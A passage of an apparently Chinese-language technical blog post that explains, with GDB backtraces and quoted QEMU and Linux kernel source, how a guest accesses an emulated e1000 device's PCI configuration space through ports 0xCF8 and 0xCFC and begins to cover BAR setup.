&lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/process.c:147</span></span><br><span class="line"><span class="comment">//#33 0xffffffff8100244a in ret_from_fork_asm () at /home/hawk/Desktop/mqemu/kernel/arch/x86/entry/entry_64.S:243</span></span><br><span class="line"><span class="comment">//#34 0x0000000000000000 in ?? ()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUILDIO(bwl, bw, type)\</span></span><br><span class="line"><span class="meta">static __always_inline void __out##bwl(type value, u16 port)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">asm volatile(<span class="string">&quot;out&quot;</span> #bwl <span class="string">&quot; %&quot;</span> #bw <span class="string">&quot;0, %w1&quot;</span>\</span></span><br><span class="line"><span class="meta">     : : <span class="string">&quot;a&quot;</span>(value), <span class="string">&quot;Nd&quot;</span>(port));\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line">BUILDIO(l,  , u32)</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outl __outl</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pci_conf1_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seg, <span class="type">unsigned</span> <span class="type">int</span> bus,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> devfn, <span class="type">int</span> reg, <span class="type">int</span> len, u32 *value)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (seg || (bus &gt; <span class="number">255</span>) || (devfn &gt; <span class="number">255</span>) || (reg &gt; <span class="number">4095</span>)) &#123;</span><br><span class="line">*value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_irqsave(&amp;pci_config_lock, flags);</span><br><span class="line"></span><br><span class="line">outl(PCI_CONF1_ADDRESS(bus, devfn, reg), <span class="number">0xCF8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (len) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">*value = inb(<span class="number">0xCFC</span> + (reg &amp; <span class="number">3</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">*value = inw(<span class="number">0xCFC</span> + (reg &amp; <span class="number">2</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">*value = inl(<span class="number">0xCFC</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">raw_spin_unlock_irqrestore(&amp;pci_config_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，<strong>guest</strong>在访问<strong>PCI</strong>设备配置空间时，首先获取<strong>pci_config_lock</strong>锁，首先通过<code>outl(PCI_CONF1_ADDRESS(bus, devfn, reg), 0xCF8)</code>设定<strong>CONFIG_ADDRESS</strong>，指定访问的PCI设备。然后在访问<strong>CONFIG_DATA</strong>寄存器访问数据即可。</p><h4 id="访问配置空间"><a href="#访问配置空间" class="headerlink" title="访问配置空间"></a>访问配置空间</h4><p>在指定完<strong>CONFIG_ADDRESS</strong>寄存器后，即可通过<strong>pio</strong>访问指定的<strong>PCI设备</strong>的配置空间了。根据前面<a href="#PCI配置空间">PCI配置空间</a>和<a href="#对象初始化">PCIHost对象初始化</a>可知，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L191"><strong>pci_host_data_read()</strong></a>/<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L182"><strong>pci_host_data_write()</strong></a>来模拟Qemu对<strong>CONFIG_DATA</strong>寄存器的访问操作，如下是一个写操作的例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_host_data_write (opaque=0x5555573de7c0, addr=0, val=263, len=2) at ../../qemu/hw/pci/pci_host.c:187</span></span><br><span class="line"><span class="comment">//#1  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555573dec00, addr=0, value=0x7ffff6954598, size=2, shift=0, mask=65535, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#2  0x0000555555e19d39 in access_with_adjusted_size (addr=0, value=0x7ffff6954598, size=2, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555573dec00, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555573dec00, addr=0, data=263, op=MO_16, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;\a\001&quot;, len=2, mr_addr=0, l=0x7ffff6954680, mr=0x5555573dec00) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee828cfd0, addr=3324, attrs=..., ptr=0x7ffff7f8a000, len=2, mr_addr=0, l=2, mr=0x5555573dec00) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e2b982 in flatview_write (fv=0x7ffee828cfd0, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e2bdd0 in address_space_write (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2be4c in address_space_rw (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e85476 in kvm_handle_io (port=3324, attrs=..., data=0x7ffff7f8a000, direction=1, size=2, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e85de6 in kvm_cpu_exec (cpu=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#12 0x00005555560b2687 in qemu_thread_start (args=0x5555573aa760) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#13 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#14 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_host_data_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                <span class="type">uint64_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIHostState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;config_reg &amp; (<span class="number">1u</span> &lt;&lt; <span class="number">31</span>))</span><br><span class="line">        pci_data_write(s-&gt;bus, s-&gt;config_reg | (addr &amp; <span class="number">3</span>), val, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后其会<code>s-&gt;config_reg</code>的值，按照前面<a href="#对象初始化-1">PCI总线</a>介绍的定位到<strong>PCI设备</strong>，并调用<strong>e1000</strong>之前<a href="#实例化-1">实例化</a>时设置的<strong>config_write</strong>字段<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L1624"><strong>e1000_write_config</strong></a>设置其<strong>配置空间</strong>即可(否则调用<strong>do_pci_register_device</strong>设置的函数指针即可)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  e1000_write_config (pci_dev=0x5555580b0870, address=4, val=263, len=2) at ../../qemu/hw/net/e1000.c:1627</span></span><br><span class="line"><span class="comment">//#1  0x0000555555a9e85a in pci_host_config_write_common (pci_dev=0x5555580b0870, addr=4, limit=256, val=263, len=2) at ../../qemu/hw/pci/pci_host.c:96</span></span><br><span class="line"><span class="comment">//#2  0x0000555555a9eaa6 in pci_data_write (s=0x555557415420, addr=2147489796, val=263, len=2) at ../../qemu/hw/pci/pci_host.c:138</span></span><br><span class="line"><span class="comment">//#3  0x0000555555a9ec7b in pci_host_data_write (opaque=0x5555573de7c0, addr=0, val=263, len=2) at ../../qemu/hw/pci/pci_host.c:188</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555573dec00, addr=0, value=0x7ffff6954598, size=2, shift=0, mask=65535, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e19d39 in access_with_adjusted_size (addr=0, value=0x7ffff6954598, size=2, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555573dec00, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555573dec00, addr=0, data=263, op=MO_16, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;\a\001&quot;, len=2, mr_addr=0, l=0x7ffff6954680, mr=0x5555573dec00) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee828cfd0, addr=3324, attrs=..., ptr=0x7ffff7f8a000, len=2, mr_addr=0, l=2, mr=0x5555573dec00) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e2b982 in flatview_write (fv=0x7ffee828cfd0, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2bdd0 in address_space_write (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e2be4c in address_space_rw (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=2, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e85476 in kvm_handle_io (port=3324, attrs=..., data=0x7ffff7f8a000, direction=1, size=2, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e85de6 in kvm_cpu_exec (cpu=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#15 0x00005555560b2687 in qemu_thread_start (args=0x5555573aa760) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#16 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_data_write</span><span class="params">(PCIBus *s, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val, <span class="type">unsigned</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDevice *pci_dev = pci_dev_find_by_addr(s, addr);</span><br><span class="line">    <span class="type">uint32_t</span> config_addr = addr &amp; (PCI_CONFIG_SPACE_SIZE - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pci_dev) &#123;</span><br><span class="line">        trace_pci_cfg_write(<span class="string">&quot;empty&quot;</span>, extract32(addr, <span class="number">16</span>, <span class="number">8</span>),</span><br><span class="line">                            extract32(addr, <span class="number">11</span>, <span class="number">5</span>), extract32(addr, <span class="number">8</span>, <span class="number">3</span>),</span><br><span class="line">                            config_addr, val);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_host_config_write_common(pci_dev, config_addr, PCI_CONFIG_SPACE_SIZE,</span><br><span class="line">                                 val, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_host_config_write_common</span><span class="params">(PCIDevice *pci_dev, <span class="type">uint32_t</span> addr,</span></span><br><span class="line"><span class="params">                                  <span class="type">uint32_t</span> limit, <span class="type">uint32_t</span> val, <span class="type">uint32_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    pci_adjust_config_limit(pci_get_bus(pci_dev), &amp;limit);</span><br><span class="line">    <span class="keyword">if</span> (limit &lt;= addr) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(len &lt;= <span class="number">4</span>);</span><br><span class="line">    <span class="comment">/* non-zero functions are only exposed when function 0 is present,</span></span><br><span class="line"><span class="comment">     * allowing direct removal of unexposed functions.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> ((pci_dev-&gt;qdev.hotplugged &amp;&amp; !pci_get_function_0(pci_dev)) ||</span><br><span class="line">        !pci_dev-&gt;has_power || is_pci_dev_ejected(pci_dev)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_pci_cfg_write(pci_dev-&gt;name, pci_dev_bus_num(pci_dev),</span><br><span class="line">                        PCI_SLOT(pci_dev-&gt;devfn),</span><br><span class="line">                        PCI_FUNC(pci_dev-&gt;devfn), addr, val);</span><br><span class="line">    pci_dev-&gt;config_write(pci_dev, addr, val, MIN(len, limit - addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而对应的<strong>guest</strong>则是调用<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/arch/x86/include/asm/shared/io.h#L32"><strong>outl()</strong></a>向<strong>0xcf8</strong>写入对应的地址，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  0xffffffff81eaf11f in pci_conf1_write (seg=&lt;optimized out&gt;, bus=&lt;optimized out&gt;, devfn=24, reg=&lt;optimized out&gt;, len=2, value=263) at /home/hawk/Desktop/mqemu/kernel/arch/x86/pci/direct.c:69</span></span><br><span class="line"><span class="comment">//#1  0xffffffff81582aea in __pci_set_master (enable=true, dev=0xffff888100863000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:4200</span></span><br><span class="line"><span class="comment">//#2  pci_set_master (dev=dev@entry=0xffff888100863000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci.c:4253</span></span><br><span class="line"><span class="comment">//#3  0xffffffff8199c810 in e1000_probe (pdev=0xffff888100863000, ent=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/net/ethernet/intel/e1000/e1000_main.c:952</span></span><br><span class="line"><span class="comment">//#4  0xffffffff81584ba2 in local_pci_probe (_ddi=_ddi@entry=0xffffc90000013d30) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:324</span></span><br><span class="line"><span class="comment">//#5  0xffffffff81585add in pci_call_probe (id=&lt;optimized out&gt;, dev=0xffff888100863000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:392</span></span><br><span class="line"><span class="comment">//#6  __pci_device_probe (pci_dev=0xffff888100863000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:417</span></span><br><span class="line"><span class="comment">//#7  pci_device_probe (dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:451</span></span><br><span class="line"><span class="comment">//#8  0xffffffff818bd81c in call_driver_probe (drv=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:578</span></span><br><span class="line"><span class="comment">//#9  really_probe (dev=dev@entry=0xffff8881008630c0, drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:656</span></span><br><span class="line"><span class="comment">//#10 0xffffffff818bda8e in __driver_probe_device (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=dev@entry=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:798</span></span><br><span class="line"><span class="comment">//#11 0xffffffff818bdb69 in driver_probe_device (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=dev@entry=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:828</span></span><br><span class="line"><span class="comment">//#12 0xffffffff818bdde5 in __driver_attach (data=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, dev=0xffff8881008630c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1214</span></span><br><span class="line"><span class="comment">//#13 __driver_attach (dev=0xffff8881008630c0, data=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1154</span></span><br><span class="line"><span class="comment">//#14 0xffffffff818bb5b7 in bus_for_each_dev (bus=&lt;optimized out&gt;, start=start@entry=0x0 &lt;fixed_percpu_data&gt;, data=data@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;, fn=fn@entry=0xffffffff818bdd60 &lt;__driver_attach&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:368</span></span><br><span class="line"><span class="comment">//#15 0xffffffff818bd1f9 in driver_attach (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1231</span></span><br><span class="line"><span class="comment">//#16 0xffffffff818bc997 in bus_add_driver (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:673</span></span><br><span class="line"><span class="comment">//#17 0xffffffff818bef8b in driver_register (drv=drv@entry=0xffffffff82bfe808 &lt;e1000_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/driver.c:246</span></span><br><span class="line"><span class="comment">//#18 0xffffffff8158447c in __pci_register_driver (drv=drv@entry=0xffffffff82bfe7a0 &lt;e1000_driver&gt;, owner=owner@entry=0x0 &lt;fixed_percpu_data&gt;, mod_name=mod_name@entry=0xffffffff827051f5 &quot;e1000&quot;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:1450</span></span><br><span class="line"><span class="comment">//#19 0xffffffff832a4c31 in e1000_init_module () at /home/hawk/Desktop/mqemu/kernel/drivers/net/ethernet/intel/e1000/e1000_main.c:227</span></span><br><span class="line"><span class="comment">//#20 0xffffffff81001a63 in do_one_initcall (fn=0xffffffff832a4bf0 &lt;e1000_init_module&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1238</span></span><br><span class="line"><span class="comment">//#21 0xffffffff832481d7 in do_initcall_level (command_line=0xffff888100333140 &quot;rdinit&quot;, level=6) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1300</span></span><br><span class="line"><span class="comment">//#22 do_initcalls () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1316</span></span><br><span class="line"><span class="comment">//#23 do_basic_setup () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1335</span></span><br><span class="line"><span class="comment">//#24 kernel_init_freeable () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1548</span></span><br><span class="line"><span class="comment">//#25 0xffffffff81ee5285 in kernel_init (unused=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1437</span></span><br><span class="line"><span class="comment">//#26 0xffffffff8103be2f in ret_from_fork (prev=&lt;optimized out&gt;, regs=0xffffc90000013f58, fn=0xffffffff81ee5270 &lt;kernel_init&gt;, fn_arg=0x0 &lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/process.c:147</span></span><br><span class="line"><span class="comment">//#27 0xffffffff8100244a in ret_from_fork_asm () at /home/hawk/Desktop/mqemu/kernel/arch/x86/entry/entry_64.S:243</span></span><br><span class="line"><span class="comment">//#28 0x0000000000000000 in ?? ()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUILDIO(bwl, bw, type)\</span></span><br><span class="line"><span class="meta">static __always_inline void __out##bwl(type value, u16 port)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">asm volatile(<span class="string">&quot;out&quot;</span> #bwl <span class="string">&quot; %&quot;</span> #bw <span class="string">&quot;0, %w1&quot;</span>\</span></span><br><span class="line"><span class="meta">     : : <span class="string">&quot;a&quot;</span>(value), <span class="string">&quot;Nd&quot;</span>(port));\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line">BUILDIO(w, w, u16)</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outw __outw</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pci_conf1_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seg, <span class="type">unsigned</span> <span class="type">int</span> bus,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> devfn, <span class="type">int</span> reg, <span class="type">int</span> len, u32 value)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (seg || (bus &gt; <span class="number">255</span>) || (devfn &gt; <span class="number">255</span>) || (reg &gt; <span class="number">4095</span>))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_irqsave(&amp;pci_config_lock, flags);</span><br><span class="line"></span><br><span class="line">outl(PCI_CONF1_ADDRESS(bus, devfn, reg), <span class="number">0xCF8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (len) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">outb((u8)value, <span class="number">0xCFC</span> + (reg &amp; <span class="number">3</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">outw((u16)value, <span class="number">0xCFC</span> + (reg &amp; <span class="number">2</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">outl((u32)value, <span class="number">0xCFC</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">raw_spin_unlock_irqrestore(&amp;pci_config_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，类似前面<a href="#指定设备">指定设备</a>，在指定访问的PCI设备后，即可通过<strong>in/out</strong>访问<strong>CONFIG_DATA</strong>寄存器访问数据。</p><h4 id="设置BAR"><a href="#设置BAR" class="headerlink" title="设置BAR"></a>设置BAR</h4><p>参考前面<a href="#PCI配置空间">BAR</a>相关内容，操作系统需要通过与<strong>BAR</strong>交互完成<strong>BAR</strong>的配置，从而将Qemu中<strong>BAR</strong>的<strong>MemoryRegion</strong>映射到<strong>AddressSpace</strong>中</p><p>首先，<strong>guest</strong>使用<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/pci/probe.c#L176"><strong>__pci_read_base()</strong></a>读取<strong>PCI设备</strong>的<strong>BAR</strong>内容，获取<strong>BAR</strong>空间的大小等信息，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 